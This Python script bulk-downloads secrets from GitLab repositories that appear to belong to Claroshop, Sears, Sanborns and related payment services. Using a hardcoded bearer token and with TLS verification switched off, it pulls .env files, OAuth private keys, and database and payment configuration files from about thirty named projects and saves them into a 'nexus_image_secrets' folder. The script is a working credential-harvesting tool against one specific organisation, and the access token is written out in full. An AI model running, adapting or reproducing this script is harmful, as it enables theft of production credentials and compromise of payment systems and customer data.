"""Fetch specific critical files from GitLab repos (envs, keys, db configs)."""
import json, urllib.request, urllib.parse, ssl, io, sys, os, re

sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
TOK = "c07d2c6e0df60d71bfe5fc6bd2b024fa3c66fc3bf319923b4e8bddda445e890e"
HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "nexus_image_secrets", "gitlab_critical")
os.makedirs(OUT, exist_ok=True)


def api(path, raw=False):
    r = urllib.request.Request("https://gitlab.dev.claroshop.com/api/v4" + path,
                               headers={"Authorization": "Bearer " + TOK})
    data = urllib.request.urlopen(r, timeout=30, context=ctx).read()
    return data if raw else json.loads(data)


projs = json.load(open(os.path.join(HERE, "gitlab_projects_all.json"), encoding="utf-8"))
path2id = {p["path"]: p["id"] for p in projs}

FILES = [
    ("claroshop/admin_t1pagos", [".env.dev", ".env.qa", ".env.example", "config/.env", "config/database.php"]),
    ("claroshop/admin_geotrack_t1envios-", ["config/.env", "config/.env.prod", "config/database.php"]),
    ("claroshop/api_pedidos_claroshop", [".env"]),
    ("claroshop/api_plataforma_claro_alibaba", ["config/oauth-private.key", "config/.env", "config/database.php"]),
    ("claroshop/monedero-api", ["data/oauth2/private.key", "config/autoload/db.global.php"]),
    ("claroshop/panel_operativo_tiendas", [".env.production", ".env.release", ".env.qa", ".env.development", "config/database.php"]),
    ("claroshop/core_claroenvios", [".env.dev", ".env.qa", "config/.env", "config/database.php"]),
    ("claroshop/api_marketplace_sanborns", ["config/.env", "config/database.php"]),
    ("claroshop/api_marketplace_sears", ["config/database.php"]),
    ("sears-ia-backend/crones/cron-conciliacion-pagos", ["app/Config/config_dai.php", "config/local.php"]),
    ("caja/payment-claropay", ["config/autoload/local.php"]),
    ("caja/payment-paypal", ["config/autoload/local.php"]),
    ("caja/payment-t1", ["config/autoload/local.php"]),
    ("claroshop/admin_axii_sears", ["web/reporte_pedidos_api/config.php"]),
    ("claroshop/api_fincado_sears", ["config/database.php"]),
    ("sears/api_credito_sears", ["config/autoload/local.php"]),
    ("claroshop/api_mails", ["config/local.php"]),
    ("claroshop/api-shipping", ["config/autoload/local.php"]),
    ("claroshop/caja-pagos-api", ["config/local.php", "config/local.php.dist"]),
    ("claroshop/conciliacion_mesa_sears", ["web/config/Mylocal.php", "web/config/local.php"]),
    ("claroshop/tienda_claroshop", ["config/local.php.dist"]),
    ("sears/tienda", ["config/local.php.dist"]),
    ("sanborns/tienda", ["config/local.php.dist"]),
    ("claroshop/api_claroshop_alibaba", ["config/.env", "config/database.php"]),
    ("claroshop/api_plataforma_claro_alibaba", [".env.example"]),
    ("claroshop/api_sears_alibaba", ["config/database.php"]),
    ("claroshop/api_sistemas_claro", ["config/database.php"]),
    ("claroshop/new_axii_v2", ["config/database.php"]),
    ("sears/api-sf-productos", ["config/database.php"]),
]

saved = []
for proj, files in FILES:
    pid = path2id.get(proj)
    if not pid:
        print(f"[SKIP] {proj} not in list")
        continue
    for fp in files:
        enc = urllib.parse.quote(fp, safe="")
        text = None
        for ref in ("master", "develop", "main"):
            try:
                text = api(f"/projects/{pid}/repository/files/{enc}/raw?ref={ref}", raw=True).decode("utf-8", errors="replace")
                break
            except Exception:
                continue
        if text is None:
            print(f"[404] {proj} :: {fp}")
            continue
        safe = re.sub(r"[^A-Za-z0-9_.-]", "_", f"{proj}__{fp}")
        with open(os.path.join(OUT, safe), "w", encoding="utf-8", newline="\n") as f:
            f.write(text)
        saved.append((proj, fp, len(text)))
        print(f"[SAVE] {proj} :: {fp} ({len(text)}b)")

print(f"\nTOTAL: {len(saved)} -> {OUT}")
